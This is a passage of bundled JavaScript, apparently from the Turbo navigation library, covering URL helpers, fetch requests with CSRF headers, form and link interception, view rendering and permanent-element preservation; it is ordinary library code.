    return !!getExtension(url).match(/^(?:|\.(?:htm|html|xhtml|php))$/);
  }
  function isPrefixedBy(baseURL, url) {
    const prefix = getPrefix(url);
    return baseURL.href === expandURL(prefix).href || baseURL.href.startsWith(prefix);
  }
  function locationIsVisitable(location2, rootLocation) {
    return isPrefixedBy(location2, rootLocation) && isHTML(location2);
  }
  function getRequestURL(url) {
    const anchor = getAnchor(url);
    return anchor != null ? url.href.slice(0, -(anchor.length + 1)) : url.href;
  }
  function toCacheKey(url) {
    return getRequestURL(url);
  }
  function urlsAreEqual(left, right) {
    return expandURL(left).href == expandURL(right).href;
  }
  function getPathComponents(url) {
    return url.pathname.split("/").slice(1);
  }
  function getLastPathComponent(url) {
    return getPathComponents(url).slice(-1)[0];
  }
  function getPrefix(url) {
    return addTrailingSlash(url.origin + url.pathname);
  }
  function addTrailingSlash(value) {
    return value.endsWith("/") ? value : value + "/";
  }
  var FetchResponse = class {
    constructor(response) {
      this.response = response;
    }
    get succeeded() {
      return this.response.ok;
    }
    get failed() {
      return !this.succeeded;
    }
    get clientError() {
      return this.statusCode >= 400 && this.statusCode <= 499;
    }
    get serverError() {
      return this.statusCode >= 500 && this.statusCode <= 599;
    }
    get redirected() {
      return this.response.redirected;
    }
    get location() {
      return expandURL(this.response.url);
    }
    get isHTML() {
      return this.contentType && this.contentType.match(/^(?:text\/([^\s;,]+\b)?html|application\/xhtml\+xml)\b/);
    }
    get statusCode() {
      return this.response.status;
    }
    get contentType() {
      return this.header("Content-Type");
    }
    get responseText() {
      return this.response.clone().text();
    }
    get responseHTML() {
      if (this.isHTML) {
        return this.response.clone().text();
      } else {
        return Promise.resolve(void 0);
      }
    }
    header(name) {
      return this.response.headers.get(name);
    }
  };
  function activateScriptElement(element) {
    if (element.getAttribute("data-turbo-eval") == "false") {
      return element;
    } else {
      const createdScriptElement = document.createElement("script");
      const cspNonce = getMetaContent("csp-nonce");
      if (cspNonce) {
        createdScriptElement.nonce = cspNonce;
      }
      createdScriptElement.textContent = element.textContent;
      createdScriptElement.async = false;
      copyElementAttributes(createdScriptElement, element);
      return createdScriptElement;
    }
  }
  function copyElementAttributes(destinationElement, sourceElement) {
    for (const { name, value } of sourceElement.attributes) {
      destinationElement.setAttribute(name, value);
    }
  }
  function createDocumentFragment(html) {
    const template = document.createElement("template");
    template.innerHTML = html;
    return template.content;
  }
  function dispatch(eventName, { target, cancelable, detail } = {}) {
    const event = new CustomEvent(eventName, {
      cancelable,
      bubbles: true,
      composed: true,
      detail
    });
    if (target && target.isConnected) {
      target.dispatchEvent(event);
    } else {
      document.documentElement.dispatchEvent(event);
    }
    return event;
  }
  function nextRepaint() {
    if (document.visibilityState === "hidden") {
      return nextEventLoopTick();
    } else {
      return nextAnimationFrame();
    }
  }
  function nextAnimationFrame() {
    return new Promise((resolve) => requestAnimationFrame(() => resolve()));
  }
  function nextEventLoopTick() {
    return new Promise((resolve) => setTimeout(() => resolve(), 0));
  }
  function nextMicrotask() {
    return Promise.resolve();
  }
  function parseHTMLDocument(html = "") {
    return new DOMParser().parseFromString(html, "text/html");
  }
  function unindent(strings, ...values) {
    const lines = interpolate(strings, values).replace(/^\n/, "").split("\n");
    const match = lines[0].match(/^\s+/);
    const indent = match ? match[0].length : 0;
    return lines.map((line) => line.slice(indent)).join("\n");
  }
  function interpolate(strings, values) {
    return strings.reduce((result, string, i) => {
      const value = values[i] == void 0 ? "" : values[i];
      return result + string + value;
    }, "");
  }
  function uuid() {
    return Array.from({ length: 36 }).map((_, i) => {
      if (i == 8 || i == 13 || i == 18 || i == 23) {
        return "-";
      } else if (i == 14) {
        return "4";
      } else if (i == 19) {
        return (Math.floor(Math.random() * 4) + 8).toString(16);
      } else {
        return Math.floor(Math.random() * 15).toString(16);
      }
    }).join("");
  }
  function getAttribute(attributeName, ...elements) {
    for (const value of elements.map((element) => element?.getAttribute(attributeName))) {
      if (typeof value == "string")
        return value;
    }
    return null;
  }
  function hasAttribute(attributeName, ...elements) {
    return elements.some((element) => element && element.hasAttribute(attributeName));
  }
  function markAsBusy(...elements) {
    for (const element of elements) {
      if (element.localName == "turbo-frame") {
        element.setAttribute("busy", "");
      }
      element.setAttribute("aria-busy", "true");
    }
  }
  function clearBusyState(...elements) {
    for (const element of elements) {
      if (element.localName == "turbo-frame") {
        element.removeAttribute("busy");
      }
      element.removeAttribute("aria-busy");
    }
  }
  function waitForLoad(element, timeoutInMilliseconds = 2e3) {
    return new Promise((resolve) => {
      const onComplete = () => {
        element.removeEventListener("error", onComplete);
        element.removeEventListener("load", onComplete);
        resolve();
      };
      element.addEventListener("load", onComplete, { once: true });
      element.addEventListener("error", onComplete, { once: true });
      setTimeout(resolve, timeoutInMilliseconds);
    });
  }
  function getHistoryMethodForAction(action) {
    switch (action) {
      case "replace":
        return history.replaceState;
      case "advance":
      case "restore":
        return history.pushState;
    }
  }
  function isAction(action) {
    return action == "advance" || action == "replace" || action == "restore";
  }
  function getVisitAction(...elements) {
    const action = getAttribute("data-turbo-action", ...elements);
    return isAction(action) ? action : null;
  }
  function getMetaElement(name) {
    return document.querySelector(`meta[name="${name}"]`);
  }
  function getMetaContent(name) {
    const element = getMetaElement(name);
    return element && element.content;
  }
  function setMetaContent(name, content) {
    let element = getMetaElement(name);
    if (!element) {
      element = document.createElement("meta");
      element.setAttribute("name", name);
      document.head.appendChild(element);
    }
    element.setAttribute("content", content);
    return element;
  }
  function findClosestRecursively(element, selector) {
    if (element instanceof Element) {
      return element.closest(selector) || findClosestRecursively(element.assignedSlot || element.getRootNode()?.host, selector);
    }
  }
  function elementIsFocusable(element) {
    const inertDisabledOrHidden = "[inert], :disabled, [hidden], details:not([open]), dialog:not([open])";
    return !!element && element.closest(inertDisabledOrHidden) == null && typeof element.focus == "function";
  }
  function queryAutofocusableElement(elementOrDocumentFragment) {
    return Array.from(elementOrDocumentFragment.querySelectorAll("[autofocus]")).find(elementIsFocusable);
  }
  async function around(callback, reader) {
    const before = reader();
    callback();
    await nextAnimationFrame();
    const after = reader();
    return [before, after];
  }
  var LimitedSet = class extends Set {
    constructor(maxSize) {
      super();
      this.maxSize = maxSize;
    }
    add(value) {
      if (this.size >= this.maxSize) {
        const iterator = this.values();
        const oldestValue = iterator.next().value;
        this.delete(oldestValue);
      }
      super.add(value);
    }
  };
  var recentRequests = new LimitedSet(20);
  var nativeFetch = window.fetch;
  function fetchWithTurboHeaders(url, options = {}) {
    const modifiedHeaders = new Headers(options.headers || {});
    const requestUID = uuid();
    recentRequests.add(requestUID);
    modifiedHeaders.append("X-Turbo-Request-Id", requestUID);
    return nativeFetch(url, {
      ...options,
      headers: modifiedHeaders
    });
  }
  function fetchMethodFromString(method) {
    switch (method.toLowerCase()) {
      case "get":
        return FetchMethod.get;
      case "post":
        return FetchMethod.post;
      case "put":
        return FetchMethod.put;
      case "patch":
        return FetchMethod.patch;
      case "delete":
        return FetchMethod.delete;
    }
  }
  var FetchMethod = {
    get: "get",
    post: "post",
    put: "put",
    patch: "patch",
    delete: "delete"
  };
  function fetchEnctypeFromString(encoding) {
    switch (encoding.toLowerCase()) {
      case FetchEnctype.multipart:
        return FetchEnctype.multipart;
      case FetchEnctype.plain:
        return FetchEnctype.plain;
      default:
        return FetchEnctype.urlEncoded;
    }
  }
  var FetchEnctype = {
    urlEncoded: "application/x-www-form-urlencoded",
    multipart: "multipart/form-data",
    plain: "text/plain"
  };
  var FetchRequest = class {
    abortController = new AbortController();
    #resolveRequestPromise = (_value) => {
    };
    constructor(delegate, method, location2, requestBody = new URLSearchParams(), target = null, enctype = FetchEnctype.urlEncoded) {
      const [url, body] = buildResourceAndBody(expandURL(location2), method, requestBody, enctype);
      this.delegate = delegate;
      this.url = url;
      this.target = target;
      this.fetchOptions = {
        credentials: "same-origin",
        redirect: "follow",
        method,
        headers: { ...this.defaultHeaders },
        body,
        signal: this.abortSignal,
        referrer: this.delegate.referrer?.href
      };
      this.enctype = enctype;
    }
    get method() {
      return this.fetchOptions.method;
    }
    set method(value) {
      const fetchBody = this.isSafe ? this.url.searchParams : this.fetchOptions.body || new FormData();
      const fetchMethod = fetchMethodFromString(value) || FetchMethod.get;
      this.url.search = "";
      const [url, body] = buildResourceAndBody(this.url, fetchMethod, fetchBody, this.enctype);
      this.url = url;
      this.fetchOptions.body = body;
      this.fetchOptions.method = fetchMethod;
    }
    get headers() {
      return this.fetchOptions.headers;
    }
    set headers(value) {
      this.fetchOptions.headers = value;
    }
    get body() {
      if (this.isSafe) {
        return this.url.searchParams;
      } else {
        return this.fetchOptions.body;
      }
    }
    set body(value) {
      this.fetchOptions.body = value;
    }
    get location() {
      return this.url;
    }
    get params() {
      return this.url.searchParams;
    }
    get entries() {
      return this.body ? Array.from(this.body.entries()) : [];
    }
    cancel() {
      this.abortController.abort();
    }
    async perform() {
      const { fetchOptions } = this;
      this.delegate.prepareRequest(this);
      await this.#allowRequestToBeIntercepted(fetchOptions);
      try {
        this.delegate.requestStarted(this);
        const response = await fetchWithTurboHeaders(this.url.href, fetchOptions);
        return await this.receive(response);
      } catch (error2) {
        if (error2.name !== "AbortError") {
          if (this.#willDelegateErrorHandling(error2)) {
            this.delegate.requestErrored(this, error2);
          }
          throw error2;
        }
      } finally {
        this.delegate.requestFinished(this);
      }
    }
    async receive(response) {
      const fetchResponse = new FetchResponse(response);
      const event = dispatch("turbo:before-fetch-response", {
        cancelable: true,
        detail: { fetchResponse },
        target: this.target
      });
      if (event.defaultPrevented) {
        this.delegate.requestPreventedHandlingResponse(this, fetchResponse);
      } else if (fetchResponse.succeeded) {
        this.delegate.requestSucceededWithResponse(this, fetchResponse);
      } else {
        this.delegate.requestFailedWithResponse(this, fetchResponse);
      }
      return fetchResponse;
    }
    get defaultHeaders() {
      return {
        Accept: "text/html, application/xhtml+xml"
      };
    }
    get isSafe() {
      return isSafe(this.method);
    }
    get abortSignal() {
      return this.abortController.signal;
    }
    acceptResponseType(mimeType) {
      this.headers["Accept"] = [mimeType, this.headers["Accept"]].join(", ");
    }
    async #allowRequestToBeIntercepted(fetchOptions) {
      const requestInterception = new Promise((resolve) => this.#resolveRequestPromise = resolve);
      const event = dispatch("turbo:before-fetch-request", {
        cancelable: true,
        detail: {
          fetchOptions,
          url: this.url,
          resume: this.#resolveRequestPromise
        },
        target: this.target
      });
      this.url = event.detail.url;
      if (event.defaultPrevented)
        await requestInterception;
    }
    #willDelegateErrorHandling(error2) {
      const event = dispatch("turbo:fetch-request-error", {
        target: this.target,
        cancelable: true,
        detail: { request: this, error: error2 }
      });
      return !event.defaultPrevented;
    }
  };
  function isSafe(fetchMethod) {
    return fetchMethodFromString(fetchMethod) == FetchMethod.get;
  }
  function buildResourceAndBody(resource, method, requestBody, enctype) {
    const searchParams = Array.from(requestBody).length > 0 ? new URLSearchParams(entriesExcludingFiles(requestBody)) : resource.searchParams;
    if (isSafe(method)) {
      return [mergeIntoURLSearchParams(resource, searchParams), null];
    } else if (enctype == FetchEnctype.urlEncoded) {
      return [resource, searchParams];
    } else {
      return [resource, requestBody];
    }
  }
  function entriesExcludingFiles(requestBody) {
    const entries = [];
    for (const [name, value] of requestBody) {
      if (value instanceof File)
        continue;
      else
        entries.push([name, value]);
    }
    return entries;
  }
  function mergeIntoURLSearchParams(url, requestBody) {
    const searchParams = new URLSearchParams(entriesExcludingFiles(requestBody));
    url.search = searchParams.toString();
    return url;
  }
  var AppearanceObserver = class {
    started = false;
    constructor(delegate, element) {
      this.delegate = delegate;
      this.element = element;
      this.intersectionObserver = new IntersectionObserver(this.intersect);
    }
    start() {
      if (!this.started) {
        this.started = true;
        this.intersectionObserver.observe(this.element);
      }
    }
    stop() {
      if (this.started) {
        this.started = false;
        this.intersectionObserver.unobserve(this.element);
      }
    }
    intersect = (entries) => {
      const lastEntry = entries.slice(-1)[0];
      if (lastEntry?.isIntersecting) {
        this.delegate.elementAppearedInViewport(this.element);
      }
    };
  };
  var StreamMessage = class {
    static contentType = "text/vnd.turbo-stream.html";
    static wrap(message) {
      if (typeof message == "string") {
        return new this(createDocumentFragment(message));
      } else {
        return message;
      }
    }
    constructor(fragment) {
      this.fragment = importStreamElements(fragment);
    }
  };
  function importStreamElements(fragment) {
    for (const element of fragment.querySelectorAll("turbo-stream")) {
      const streamElement = document.importNode(element, true);
      for (const inertScriptElement of streamElement.templateElement.content.querySelectorAll("script")) {
        inertScriptElement.replaceWith(activateScriptElement(inertScriptElement));
      }
      element.replaceWith(streamElement);
    }
    return fragment;
  }
  var FormSubmissionState = {
    initialized: "initialized",
    requesting: "requesting",
    waiting: "waiting",
    receiving: "receiving",
    stopping: "stopping",
    stopped: "stopped"
  };
  var FormSubmission = class _FormSubmission {
    state = FormSubmissionState.initialized;
    static confirmMethod(message, _element, _submitter) {
      return Promise.resolve(confirm(message));
    }
    constructor(delegate, formElement, submitter, mustRedirect = false) {
      const method = getMethod(formElement, submitter);
      const action = getAction(getFormAction(formElement, submitter), method);
      const body = buildFormData(formElement, submitter);
      const enctype = getEnctype(formElement, submitter);
      this.delegate = delegate;
      this.formElement = formElement;
      this.submitter = submitter;
      this.fetchRequest = new FetchRequest(this, method, action, body, formElement, enctype);
      this.mustRedirect = mustRedirect;
    }
    get method() {
      return this.fetchRequest.method;
    }
    set method(value) {
      this.fetchRequest.method = value;
    }
    get action() {
      return this.fetchRequest.url.toString();
    }
    set action(value) {
      this.fetchRequest.url = expandURL(value);
    }
    get body() {
      return this.fetchRequest.body;
    }
    get enctype() {
      return this.fetchRequest.enctype;
    }
    get isSafe() {
      return this.fetchRequest.isSafe;
    }
    get location() {
      return this.fetchRequest.url;
    }
    // The submission process
    async start() {
      const { initialized, requesting } = FormSubmissionState;
      const confirmationMessage = getAttribute("data-turbo-confirm", this.submitter, this.formElement);
      if (typeof confirmationMessage === "string") {
        const answer = await _FormSubmission.confirmMethod(confirmationMessage, this.formElement, this.submitter);
        if (!answer) {
          return;
        }
      }
      if (this.state == initialized) {
        this.state = requesting;
        return this.fetchRequest.perform();
      }
    }
    stop() {
      const { stopping, stopped } = FormSubmissionState;
      if (this.state != stopping && this.state != stopped) {
        this.state = stopping;
        this.fetchRequest.cancel();
        return true;
      }
    }
    // Fetch request delegate
    prepareRequest(request) {
      if (!request.isSafe) {
        const token = getCookieValue(getMetaContent("csrf-param")) || getMetaContent("csrf-token");
        if (token) {
          request.headers["X-CSRF-Token"] = token;
        }
      }
      if (this.requestAcceptsTurboStreamResponse(request)) {
        request.acceptResponseType(StreamMessage.contentType);
      }
    }
    requestStarted(_request) {
      this.state = FormSubmissionState.waiting;
      this.submitter?.setAttribute("disabled", "");
      this.setSubmitsWith();
      markAsBusy(this.formElement);
      dispatch("turbo:submit-start", {
        target: this.formElement,
        detail: { formSubmission: this }
      });
      this.delegate.formSubmissionStarted(this);
    }
    requestPreventedHandlingResponse(request, response) {
      this.result = { success: response.succeeded, fetchResponse: response };
    }
    requestSucceededWithResponse(request, response) {
      if (response.clientError || response.serverError) {
        this.delegate.formSubmissionFailedWithResponse(this, response);
      } else if (this.requestMustRedirect(request) && responseSucceededWithoutRedirect(response)) {
        const error2 = new Error("Form responses must redirect to another location");
        this.delegate.formSubmissionErrored(this, error2);
      } else {
        this.state = FormSubmissionState.receiving;
        this.result = { success: true, fetchResponse: response };
        this.delegate.formSubmissionSucceededWithResponse(this, response);
      }
    }
    requestFailedWithResponse(request, response) {
      this.result = { success: false, fetchResponse: response };
      this.delegate.formSubmissionFailedWithResponse(this, response);
    }
    requestErrored(request, error2) {
      this.result = { success: false, error: error2 };
      this.delegate.formSubmissionErrored(this, error2);
    }
    requestFinished(_request) {
      this.state = FormSubmissionState.stopped;
      this.submitter?.removeAttribute("disabled");
      this.resetSubmitterText();
      clearBusyState(this.formElement);
      dispatch("turbo:submit-end", {
        target: this.formElement,
        detail: { formSubmission: this, ...this.result }
      });
      this.delegate.formSubmissionFinished(this);
    }
    // Private
    setSubmitsWith() {
      if (!this.submitter || !this.submitsWith)
        return;
      if (this.submitter.matches("button")) {
        this.originalSubmitText = this.submitter.innerHTML;
        this.submitter.innerHTML = this.submitsWith;
      } else if (this.submitter.matches("input")) {
        const input = this.submitter;
        this.originalSubmitText = input.value;
        input.value = this.submitsWith;
      }
    }
    resetSubmitterText() {
      if (!this.submitter || !this.originalSubmitText)
        return;
      if (this.submitter.matches("button")) {
        this.submitter.innerHTML = this.originalSubmitText;
      } else if (this.submitter.matches("input")) {
        const input = this.submitter;
        input.value = this.originalSubmitText;
      }
    }
    requestMustRedirect(request) {
      return !request.isSafe && this.mustRedirect;
    }
    requestAcceptsTurboStreamResponse(request) {
      return !request.isSafe || hasAttribute("data-turbo-stream", this.submitter, this.formElement);
    }
    get submitsWith() {
      return this.submitter?.getAttribute("data-turbo-submits-with");
    }
  };
  function buildFormData(formElement, submitter) {
    const formData = new FormData(formElement);
    const name = submitter?.getAttribute("name");
    const value = submitter?.getAttribute("value");
    if (name) {
      formData.append(name, value || "");
    }
    return formData;
  }
  function getCookieValue(cookieName) {
    if (cookieName != null) {
      const cookies = document.cookie ? document.cookie.split("; ") : [];
      const cookie = cookies.find((cookie2) => cookie2.startsWith(cookieName));
      if (cookie) {
        const value = cookie.split("=").slice(1).join("=");
        return value ? decodeURIComponent(value) : void 0;
      }
    }
  }
  function responseSucceededWithoutRedirect(response) {
    return response.statusCode == 200 && !response.redirected;
  }
  function getFormAction(formElement, submitter) {
    const formElementAction = typeof formElement.action === "string" ? formElement.action : null;
    if (submitter?.hasAttribute("formaction")) {
      return submitter.getAttribute("formaction") || "";
    } else {
      return formElement.getAttribute("action") || formElementAction || "";
    }
  }
  function getAction(formAction, fetchMethod) {
    const action = expandURL(formAction);
    if (isSafe(fetchMethod)) {
      action.search = "";
    }
    return action;
  }
  function getMethod(formElement, submitter) {
    const method = submitter?.getAttribute("formmethod") || formElement.getAttribute("method") || "";
    return fetchMethodFromString(method.toLowerCase()) || FetchMethod.get;
  }
  function getEnctype(formElement, submitter) {
    return fetchEnctypeFromString(submitter?.getAttribute("formenctype") || formElement.enctype);
  }
  var Snapshot = class {
    constructor(element) {
      this.element = element;
    }
    get activeElement() {
      return this.element.ownerDocument.activeElement;
    }
    get children() {
      return [...this.element.children];
    }
    hasAnchor(anchor) {
      return this.getElementForAnchor(anchor) != null;
    }
    getElementForAnchor(anchor) {
      return anchor ? this.element.querySelector(`[id='${anchor}'], a[name='${anchor}']`) : null;
    }
    get isConnected() {
      return this.element.isConnected;
    }
    get firstAutofocusableElement() {
      return queryAutofocusableElement(this.element);
    }
    get permanentElements() {
      return queryPermanentElementsAll(this.element);
    }
    getPermanentElementById(id) {
      return getPermanentElementById(this.element, id);
    }
    getPermanentElementMapForSnapshot(snapshot) {
      const permanentElementMap = {};
      for (const currentPermanentElement of this.permanentElements) {
        const { id } = currentPermanentElement;
        const newPermanentElement = snapshot.getPermanentElementById(id);
        if (newPermanentElement) {
          permanentElementMap[id] = [currentPermanentElement, newPermanentElement];
        }
      }
      return permanentElementMap;
    }
  };
  function getPermanentElementById(node, id) {
    return node.querySelector(`#${id}[data-turbo-permanent]`);
  }
  function queryPermanentElementsAll(node) {
    return node.querySelectorAll("[id][data-turbo-permanent]");
  }
  var FormSubmitObserver = class {
    started = false;
    constructor(delegate, eventTarget) {
      this.delegate = delegate;
      this.eventTarget = eventTarget;
    }
    start() {
      if (!this.started) {
        this.eventTarget.addEventListener("submit", this.submitCaptured, true);
        this.started = true;
      }
    }
    stop() {
      if (this.started) {
        this.eventTarget.removeEventListener("submit", this.submitCaptured, true);
        this.started = false;
      }
    }
    submitCaptured = () => {
      this.eventTarget.removeEventListener("submit", this.submitBubbled, false);
      this.eventTarget.addEventListener("submit", this.submitBubbled, false);
    };
    submitBubbled = (event) => {
      if (!event.defaultPrevented) {
        const form = event.target instanceof HTMLFormElement ? event.target : void 0;
        const submitter = event.submitter || void 0;
        if (form && submissionDoesNotDismissDialog(form, submitter) && submissionDoesNotTargetIFrame(form, submitter) && this.delegate.willSubmitForm(form, submitter)) {
          event.preventDefault();
          event.stopImmediatePropagation();
          this.delegate.formSubmitted(form, submitter);
        }
      }
    };
  };
  function submissionDoesNotDismissDialog(form, submitter) {
    const method = submitter?.getAttribute("formmethod") || form.getAttribute("method");
    return method != "dialog";
  }
  function submissionDoesNotTargetIFrame(form, submitter) {
    if (submitter?.hasAttribute("formtarget") || form.hasAttribute("target")) {
      const target = submitter?.getAttribute("formtarget") || form.target;
      for (const element of document.getElementsByName(target)) {
        if (element instanceof HTMLIFrameElement)
          return false;
      }
      return true;
    } else {
      return true;
    }
  }
  var View = class {
    #resolveRenderPromise = (_value) => {
    };
    #resolveInterceptionPromise = (_value) => {
    };
    constructor(delegate, element) {
      this.delegate = delegate;
      this.element = element;
    }
    // Scrolling
    scrollToAnchor(anchor) {
      const element = this.snapshot.getElementForAnchor(anchor);
      if (element) {
        this.scrollToElement(element);
        this.focusElement(element);
      } else {
        this.scrollToPosition({ x: 0, y: 0 });
      }
    }
    scrollToAnchorFromLocation(location2) {
      this.scrollToAnchor(getAnchor(location2));
    }
    scrollToElement(element) {
      element.scrollIntoView();
    }
    focusElement(element) {
      if (element instanceof HTMLElement) {
        if (element.hasAttribute("tabindex")) {
          element.focus();
        } else {
          element.setAttribute("tabindex", "-1");
          element.focus();
          element.removeAttribute("tabindex");
        }
      }
    }
    scrollToPosition({ x, y }) {
      this.scrollRoot.scrollTo(x, y);
    }
    scrollToTop() {
      this.scrollToPosition({ x: 0, y: 0 });
    }
    get scrollRoot() {
      return window;
    }
    // Rendering
    async render(renderer) {
      const { isPreview, shouldRender, newSnapshot: snapshot } = renderer;
      if (shouldRender) {
        try {
          this.renderPromise = new Promise((resolve) => this.#resolveRenderPromise = resolve);
          this.renderer = renderer;
          await this.prepareToRenderSnapshot(renderer);
          const renderInterception = new Promise((resolve) => this.#resolveInterceptionPromise = resolve);
          const options = { resume: this.#resolveInterceptionPromise, render: this.renderer.renderElement };
          const immediateRender = this.delegate.allowsImmediateRender(snapshot, isPreview, options);
          if (!immediateRender)
            await renderInterception;
          await this.renderSnapshot(renderer);
          this.delegate.viewRenderedSnapshot(snapshot, isPreview, this.renderer.renderMethod);
          this.delegate.preloadOnLoadLinksForView(this.element);
          this.finishRenderingSnapshot(renderer);
        } finally {
          delete this.renderer;
          this.#resolveRenderPromise(void 0);
          delete this.renderPromise;
        }
      } else {
        this.invalidate(renderer.reloadReason);
      }
    }
    invalidate(reason) {
      this.delegate.viewInvalidated(reason);
    }
    async prepareToRenderSnapshot(renderer) {
      this.markAsPreview(renderer.isPreview);
      await renderer.prepareToRender();
    }
    markAsPreview(isPreview) {
      if (isPreview) {
        this.element.setAttribute("data-turbo-preview", "");
      } else {
        this.element.removeAttribute("data-turbo-preview");
      }
    }
    markVisitDirection(direction) {
      this.element.setAttribute("data-turbo-visit-direction", direction);
    }
    unmarkVisitDirection() {
      this.element.removeAttribute("data-turbo-visit-direction");
    }
    async renderSnapshot(renderer) {
      await renderer.render();
    }
    finishRenderingSnapshot(renderer) {
      renderer.finishRendering();
    }
  };
  var FrameView = class extends View {
    missing() {
      this.element.innerHTML = `<strong class="turbo-frame-error">Content missing</strong>`;
    }
    get snapshot() {
      return new Snapshot(this.element);
    }
  };
  var LinkInterceptor = class {
    constructor(delegate, element) {
      this.delegate = delegate;
      this.element = element;
    }
    start() {
      this.element.addEventListener("click", this.clickBubbled);
      document.addEventListener("turbo:click", this.linkClicked);
      document.addEventListener("turbo:before-visit", this.willVisit);
    }
    stop() {
      this.element.removeEventListener("click", this.clickBubbled);
      document.removeEventListener("turbo:click", this.linkClicked);
      document.removeEventListener("turbo:before-visit", this.willVisit);
    }
    clickBubbled = (event) => {
      if (this.respondsToEventTarget(event.target)) {
        this.clickEvent = event;
      } else {
        delete this.clickEvent;
      }
    };
    linkClicked = (event) => {
      if (this.clickEvent && this.respondsToEventTarget(event.target) && event.target instanceof Element) {
        if (this.delegate.shouldInterceptLinkClick(event.target, event.detail.url, event.detail.originalEvent)) {
          this.clickEvent.preventDefault();
          event.preventDefault();
          this.delegate.linkClickIntercepted(event.target, event.detail.url, event.detail.originalEvent);
        }
      }
      delete this.clickEvent;
    };
    willVisit = (_event) => {
      delete this.clickEvent;
    };
    respondsToEventTarget(target) {
      const element = target instanceof Element ? target : target instanceof Node ? target.parentElement : null;
      return element && element.closest("turbo-frame, html") == this.element;
    }
  };
  var LinkClickObserver = class {
    started = false;
    constructor(delegate, eventTarget) {
      this.delegate = delegate;
      this.eventTarget = eventTarget;
    }
    start() {
      if (!this.started) {
        this.eventTarget.addEventListener("click", this.clickCaptured, true);
        this.started = true;
      }
    }
    stop() {
      if (this.started) {
        this.eventTarget.removeEventListener("click", this.clickCaptured, true);
        this.started = false;
      }
    }
    clickCaptured = () => {
      this.eventTarget.removeEventListener("click", this.clickBubbled, false);
      this.eventTarget.addEventListener("click", this.clickBubbled, false);
    };
    clickBubbled = (event) => {
      if (event instanceof MouseEvent && this.clickEventIsSignificant(event)) {
        const target = event.composedPath && event.composedPath()[0] || event.target;
        const link = this.findLinkFromClickTarget(target);
        if (link && doesNotTargetIFrame(link)) {
          const location2 = this.getLocationForLink(link);
          if (this.delegate.willFollowLinkToLocation(link, location2, event)) {
            event.preventDefault();
            this.delegate.followedLinkToLocation(link, location2);
          }
        }
      }
    };
    clickEventIsSignificant(event) {
      return !(event.target && event.target.isContentEditable || event.defaultPrevented || event.which > 1 || event.altKey || event.ctrlKey || event.metaKey || event.shiftKey);
    }
    findLinkFromClickTarget(target) {
      return findClosestRecursively(target, "a[href]:not([target^=_]):not([download])");
    }
    getLocationForLink(link) {
      return expandURL(link.getAttribute("href") || "");
    }
  };
  function doesNotTargetIFrame(anchor) {
    if (anchor.hasAttribute("target")) {
      for (const element of document.getElementsByName(anchor.target)) {
        if (element instanceof HTMLIFrameElement)
          return false;
      }
      return true;
    } else {
      return true;
    }
  }
  var FormLinkClickObserver = class {
    constructor(delegate, element) {
      this.delegate = delegate;
      this.linkInterceptor = new LinkClickObserver(this, element);
    }
    start() {
      this.linkInterceptor.start();
    }
    stop() {
      this.linkInterceptor.stop();
    }
    // Link click observer delegate
    willFollowLinkToLocation(link, location2, originalEvent) {
      return this.delegate.willSubmitFormLinkToLocation(link, location2, originalEvent) && (link.hasAttribute("data-turbo-method") || link.hasAttribute("data-turbo-stream"));
    }
    followedLinkToLocation(link, location2) {
      const form = document.createElement("form");
      const type = "hidden";
      for (const [name, value] of location2.searchParams) {
        form.append(Object.assign(document.createElement("input"), { type, name, value }));
      }
      const action = Object.assign(location2, { search: "" });
      form.setAttribute("data-turbo", "true");
      form.setAttribute("action", action.href);
      form.setAttribute("hidden", "");
      const method = link.getAttribute("data-turbo-method");
      if (method)
        form.setAttribute("method", method);
      const turboFrame = link.getAttribute("data-turbo-frame");
      if (turboFrame)
        form.setAttribute("data-turbo-frame", turboFrame);
      const turboAction = getVisitAction(link);
      if (turboAction)
        form.setAttribute("data-turbo-action", turboAction);
      const turboConfirm = link.getAttribute("data-turbo-confirm");
      if (turboConfirm)
        form.setAttribute("data-turbo-confirm", turboConfirm);
      const turboStream = link.hasAttribute("data-turbo-stream");
      if (turboStream)
        form.setAttribute("data-turbo-stream", "");
      this.delegate.submittedFormLinkToLocation(link, location2, form);
      document.body.appendChild(form);
      form.addEventListener("turbo:submit-end", () => form.remove(), { once: true });
      requestAnimationFrame(() => form.requestSubmit());
    }
  };
  var Bardo = class {
    static async preservingPermanentElements(delegate, permanentElementMap, callback) {
      const bardo = new this(delegate, permanentElementMap);
      bardo.enter();
      await callback();
      bardo.leave();
    }
    constructor(delegate, permanentElementMap) {
      this.delegate = delegate;
      this.permanentElementMap = permanentElementMap;
    }
    enter() {
      for (const id in this.permanentElementMap) {
        const [currentPermanentElement, newPermanentElement] = this.permanentElementMap[id];
        this.delegate.enteringBardo(currentPermanentElement, newPermanentElement);
        this.replaceNewPermanentElementWithPlaceholder(newPermanentElement);
      }
    }
    leave() {
      for (const id in this.permanentElementMap) {
        const [currentPermanentElement] = this.permanentElementMap[id];
        this.replaceCurrentPermanentElementWithClone(currentPermanentElement);
        this.replacePlaceholderWithPermanentElement(currentPermanentElement);
        this.delegate.leavingBardo(currentPermanentElement);
      }
    }
    replaceNewPermanentElementWithPlaceholder(permanentElement) {
      const placeholder = createPlaceholderForPermanentElement(permanentElement);
      permanentElement.replaceWith(placeholder);
    }
    replaceCurrentPermanentElementWithClone(permanentElement) {
      const clone = permanentElement.cloneNode(true);
      permanentElement.replaceWith(clone);
    }
    replacePlaceholderWithPermanentElement(permanentElement) {
      const placeholder = this.getPlaceholderById(permanentElement.id);
      placeholder?.replaceWith(permanentElement);
    }
    getPlaceholderById(id) {
      return this.placeholders.find((element) => element.content == id);
    }
    get placeholders() {
      return [...document.querySelectorAll("meta[name=turbo-permanent-placeholder][content]")];
    }
  };
  function createPlaceholderForPermanentElement(permanentElement) {
    const element = document.createElement("meta");
    element.setAttribute("name", "turbo-permanent-placeholder");
    element.setAttribute("content", permanentElement.id);
    return element;
  }
  var Renderer = class {
    #activeElement = null;
    constructor(currentSnapshot, newSnapshot, renderElement, isPreview, willRender = true) {
      this.currentSnapshot = currentSnapshot;
      this.newSnapshot = newSnapshot;
      this.isPreview = isPreview;
      this.willRender = willRender;
      this.renderElement = renderElement;
      this.promise = new Promise((resolve, reject) => this.resolvingFunctions = { resolve, reject });
    }
    get shouldRender() {
      return true;
    }
    get reloadReason() {
      return;
    }
    prepareToRender() {
      return;
    }
    render() {
    }
    finishRendering() {
      if (this.resolvingFunctions) {
        this.resolvingFunctions.resolve();
        delete this.resolvingFunctions;
      }
    }
    async preservingPermanentElements(callback) {
